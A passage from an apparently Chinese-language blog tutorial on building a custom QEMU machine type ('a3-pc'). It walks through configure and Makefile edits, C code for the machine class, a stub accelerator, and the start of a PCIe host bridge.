class="hljs-built_in">test</span> <span class="hljs-string">&quot;<span class="hljs-variable">$a3_pc</span>&quot;</span> = <span class="hljs-string">&quot;yes&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    glob <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-string">&quot;*-softmmu&quot;</span> || <span class="hljs-built_in">return</span> 1<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1%-softmmu&#125;</span>&quot;</span> <span class="hljs-keyword">in</span><br>x86_64)<br>    <span class="hljs-built_in">return</span> 0<br>    ;;<br>    <span class="hljs-keyword">esac</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><br><span class="hljs-function"><span class="hljs-title">supported_target</span></span>() &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-keyword">in</span><br><span class="hljs-comment"># ...</span><br>    supported_a3_pc_target <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 0<br>    print_error <span class="hljs-string">&quot;TCG disabled, but hardware accelerator not available for &#x27;<span class="hljs-variable">$target</span>&#x27;&quot;</span><br>    <span class="hljs-built_in">return</span> 1<br>&#125;<br><span class="hljs-comment"># ...</span><br><span class="hljs-keyword">for</span> opt <span class="hljs-keyword">do</span><br>  optarg=$(<span class="hljs-built_in">expr</span> <span class="hljs-string">&quot;x<span class="hljs-variable">$opt</span>&quot;</span> : <span class="hljs-string">&#x27;x[^=]*=\(.*\)&#x27;</span>)<br>  <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$opt</span>&quot;</span> <span class="hljs-keyword">in</span><br>  --<span class="hljs-built_in">help</span>|-h) show_help=<span class="hljs-built_in">yes</span><br>  ;;<br>  <span class="hljs-comment">#...</span><br>  ;;<br>  --enable-a3-pc) a3_pc=<span class="hljs-string">&quot;yes&quot;</span><br>  ;;<br><span class="hljs-comment"># ...</span><br><span class="hljs-comment"># 这一块可以放在 supported_whpx_target 的那个语句块下面</span><br><span class="hljs-keyword">if</span> supported_a3_pc_target <span class="hljs-variable">$target</span>; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_target_mak</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;CONFIG_A3_PC=y&quot;</span> &gt;&gt; <span class="hljs-variable">$config_host_mak</span><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>如果我们想要改变编译出来的可执行文件的名字，还可以在 <code>Makefile.target</code> 中修改如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-keyword">ifdef</span> CONFIG_USER_ONLY<br><span class="hljs-comment"># user emulator name</span><br>QEMU_PROG=qemu-<span class="hljs-variable">$(TARGET_NAME)</span><br>QEMU_PROG_BUILD = <span class="hljs-variable">$(QEMU_PROG)</span><br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">ifdef</span> CONFIG_A3_PC<br><span class="hljs-comment"># arttnba3 type machine</span><br>QEMU_PROG=a3-pc<br><span class="hljs-keyword">else</span><br><span class="hljs-comment"># system emulator name</span><br>QEMU_PROG=qemu-system-<span class="hljs-variable">$(TARGET_NAME)</span><span class="hljs-variable">$(EXESUF)</span><br><span class="hljs-keyword">endif</span><br></code></pre></td></tr></table></figure><h2 id="二、定义新的-Machine-Type">二、定义新的 Machine Type</h2><h3 id="I、machine-c：machine-基本定义">I、machine.c：machine 基本定义</h3><p>虽然 Qemu 是使用 C 语言编写的，但是在 Qemu 当中同样使用了 OOP 的思想，通过结构体嵌套的形式实现继承</p><p>在 Qemu 当中使用 <code>MachineState</code> 结构体类型表示一个通用虚拟机的状态，使用 <code>MachineClass</code> 结构体类型表示一个通用的虚拟机类型，因此对于我们需要创建的新的机器类型，我们需要分别定义他的状态类与类型类，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/sysemu.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    Notifier machine_done;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineClass parent;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>这里对于继承自 MachineState 的子类我们添加了一个新的 <code>Notifier</code> 类型的成员，可以用来在后面构建事件通知链</p><p>我们还需要定义一些相应的父子类间转型的宏，以及一个表示新增的 <code>a3-pc</code> 类型的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3PC_MACHINE MACHINE_TYPE_NAME(<span class="hljs-string">&quot;a3-pc&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCMachineState, (obj), TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCMachineClass, obj, TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCMachineClass, klass, TYPE_A3PC_MACHINE)</span><br></code></pre></td></tr></table></figure><p>接下来我们定义 MachineState 与 MachineClass 的初始化函数，这里只是一个最最简单的空模板，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init_done</span><span class="hljs-params">(Notifier *notifier, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    MachineClass *mc = MACHINE_CLASS(oc);<br><br>    mc-&gt;init = a3_pc_machine_init;<br>    <span class="hljs-comment">// 这里设置了一个参数，指定了使用我们自己的 accelerator</span><br>    mc-&gt;default_machine_opts = <span class="hljs-string">&quot;accel=a3acl&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们需要声明一个 <code>TypeInfo</code> 类型的变量，用来表示我们新建的这一种机器类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_machine_info = &#123;<br>    .name = TYPE_A3PC_MACHINE,<br>    .parent = TYPE_MACHINE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineClass),<br>    .class_init = a3_pc_machine_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>最后就是注册我们的新机器类型了，这里使用 <code>type_init()</code> 来完成，原理是 gcc constructor attribute 使其会调用 <code>a3_pc_machine_register()</code> 来注册 <code>a3_pc_machine_info</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_machine_info);<br>&#125;<br>type_init(a3_pc_machine_register);<br></code></pre></td></tr></table></figure><h3 id="II、accel-c：accelerator-定义">II、accel.c：accelerator 定义</h3><p>接下来就是定义我们自己的 accelerator，因为 Qemu 默认需要一个 accelerator，但如果再去和原有的 accelerator 做适配就太麻烦了（<s>因为👴是懒🐕</s>），所以这里我们自己定义一个空的 accelerator，不过这一部分我们只需要声明一个新的 <code>TypeInfo</code> 类型变量即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-core.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel.h&quot;</span></span><br><br><span class="hljs-type">bool</span> a3_pc_allowed;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_init</span><span class="hljs-params">(MachineState *ms)</span><br>&#123;<br>    MachineClass *mc = MACHINE_GET_CLASS(ms);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * opt out of system RAM being allocated by generic code</span><br><span class="hljs-comment">     */</span><br>    mc-&gt;default_ram_id = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_accel_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelClass *ac = ACCEL_CLASS(oc);<br>    <span class="hljs-type">static</span> GlobalProperty compat[] = &#123;<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;store-global-state&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-configuration&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-section-footer&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>    &#125;;<br><br>    ac-&gt;name = <span class="hljs-string">&quot;A3ACL&quot;</span>;<br>    ac-&gt;init_machine = a3_pc_init;<br>    ac-&gt;allowed = &amp;a3_pc_allowed;<br>    ac-&gt;compat_props = g_ptr_array_new();<br><br>    compat_props_add(ac-&gt;compat_props, compat, G_N_ELEMENTS(compat));<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_ACCEL ACCEL_CLASS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_accel_type = &#123;<br>    .name = TYPE_A3_ACCEL,<br>    .parent = TYPE_ACCEL,<br>    .class_init = a3_pc_accel_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_type_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_accel_type);<br>&#125;<br><br>type_init(a3_pc_type_init);<br></code></pre></td></tr></table></figure><h4 id="新版本-accelerator-额外添加-ops">*新版本 accelerator 额外添加 ops</h4><p>需要注意的是 qemu 的 7.0 和 5.0 的版本之间代码架构有一定的改动，所以对于 7.0 版本我们还需要额外定义一个 AccelClassOps：</p><blockquote><p>当然，也可以直接用原有的 accelerator ，比如说 <code>tcg</code>，直接在 machine.c 代码中指定 <code>accel=tcg</code> 即可</p></blockquote><blockquote><p>添加文件：accel/a3acl/a3acl-accel-ops.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * QEMU A3ACL vCPU common functionality</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Copyright (c) 22 arttnba3</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Just modify it like what you want : )</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel-ops.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_handle_interrupt</span><span class="hljs-params">(CPUState *cpu, <span class="hljs-type">int</span> mask)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_kick_vcpu_thread</span><span class="hljs-params">(CPUState *unused)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_start_vcpu_thread</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_init</span><span class="hljs-params">(AccelOpsClass *ops)</span><br>&#123;<br>    <span class="hljs-comment">// 这几个函数可以按照个人需要来进行改造，笔者这里仅作占位符</span><br>    ops-&gt;create_vcpu_thread = a3acl_start_vcpu_thread;<br>    ops-&gt;kick_vcpu_thread = a3acl_kick_vcpu_thread;<br>    ops-&gt;handle_interrupt = a3acl_handle_interrupt;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelOpsClass *ops = ACCEL_OPS_CLASS(oc);<br><br>    ops-&gt;ops_init = a3acl_accel_ops_init;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3acl_accel_ops_type = &#123;<br>    .name = ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>),<br>    .parent = TYPE_ACCEL_OPS,<br>    .class_init = a3acl_accel_ops_class_init,<br>    .abstract = <span class="hljs-literal">true</span>,<br>&#125;;<br>module_obj(ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>));<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3acl_accel_ops_type);<br>&#125;<br>type_init(a3acl_accel_ops_register_types);<br><br></code></pre></td></tr></table></figure><blockquote><p>添加文件：accel/a3acl/meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3acl_ss = ss.source_set()<br>a3acl_ss.add(files(<br>  &#x27;a3acl-accel-ops.c&#x27;,<br>))<br><br>specific_ss.add_all(when: &#x27;CONFIG_A3ACL&#x27;, if_true: a3acl_ss)<br></code></pre></td></tr></table></figure><blockquote><p>修改文件：accel/meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs meson">if have_system<br>  subdir(&#x27;hvf&#x27;)<br>  subdir(&#x27;qtest&#x27;)<br>  subdir(&#x27;kvm&#x27;)<br>  subdir(&#x27;xen&#x27;)<br>  subdir(&#x27;stubs&#x27;)<br>  subdir(&#x27;a3acl&#x27;) # 加上这句<br>endif<br></code></pre></td></tr></table></figure><blockquote><p>修改文件：accel/Kconfig</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig"># 添加上这：<br>config A3ACL<br>    bool<br>    default y<br></code></pre></td></tr></table></figure><h2 id="三、添加设备结构🕊">三、添加设备结构🕊</h2><p>现在我们已经有了一台可以运行的空白的机器——但包括 CPU 在内的所有设备目前暂且都是不存在的，因此我们需要手动地构造机器的设备结构</p><h3 id="I、添加新的-PCIe-Host-Bridge">I、添加新的 PCIe Host Bridge</h3><p>一个空的机器什么都没有，那自然是什么都干不了的，所以我们首先需要为这个机器添加上一个 <code>PCIe Host Bridge</code>，从而让我们的机器可以添加新的 PCIe 设备</p><p>惯例地就是定义一个新的 <code>PCIe Host Bridge</code> 类型的新 PCIe 设备：</p><blockquote><p>添加文件：include/hw/pci-host/a3pc.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> HW_A3_PC_PCIE_HOST_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HW_A3_PC_PCIE_HOST_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCPCIEHost</span> &#123;</span><br>    PCIExpressHost parent_obj;<br><br>    MemoryRegion mem;<br>    MemoryRegion io;<br>&#125; A3PCPCIEHost;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_PC_PCIE_HOST <span class="hljs-string">&quot;a3-pc-pcie-host&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3_PC_PCIE_HOST(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCPCIEHost, (obj), TYPE_A3_PC_PCIE_HOST)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* HW_A3_PC_PCIE_HOST_H */</span></span><br></code></pre></td></tr></table></figure><blockquote><p>添加文件：hw/pci-host/a3pc.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci-host/a3pc.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/error-report.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_host_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// nothing to do</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_set_irq</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, <span class="hljs-type">int</span> irq_num, <span class="hljs-type">int</span> level)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (irq %d, level %d)&quot;</span>,<br>                irq_num, level);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_pcie_swizzle_map_irq_fn</span><span class="hljs-params">(PCIDevice *pci_dev, <span class="hljs-type">int</span> pin)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (pin %d)&quot;</span>, pin);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_realize</span><span class="hljs-params">(DeviceState *dev, Error **errp)</span><br>&#123;<br>    PCIHostState *pci = PCI_HOST_BRIDGE(dev);<br>    A3PCPCIEHost *h = A3_PC_PCIE_HOST(dev);<br>    SysBusDevice *sbd = SYS_BUS_DEVICE(dev);<br><br>    memory_region_init(&amp;h-&gt;mem, OBJECT(h), <span class="hljs-string">&quot;a3-pc-mem&quot;</span>, <span class="hljs-number">16</span>);<br>    memory_region_init(&amp;h-&gt;io, OBJECT(h), <span class="hljs-string">&quot;a3-pc-io&quot;</span>, <span class="hljs-number">16</span>);<br>    sysbus_init_mmio(sbd, &amp;h-&gt;mem);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * A PCIe host in QEMU is required to provide</span><br><span class="hljs-comment">     * a pair of callbacks: set_irq() and map_irq()</span><br><span class="hljs-comment">     */</span><br>    pci-&gt;bus = pci_register_root_bus(dev, <span class="hljs-string">&quot;a3-pcie0&quot;</span>,<br>                                    a3_pc_pcie_set_irq,<br>                                    a3_pc_pcie_swizzle_map_irq_fn,<br>                                    h, &amp;h-&gt;mem, &amp;h-&gt;io, <br>                                    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, TYPE_PCIE_BUS);<br>&#125;<br><br><span class="hljs-type">static</span> Property a3_pc_pcie_host_props[] = &#123;<br>    DEFINE_PROP_END_OF_LIST(),<br>&#125;;<br><br><span class="hljs-type">static</span> <span 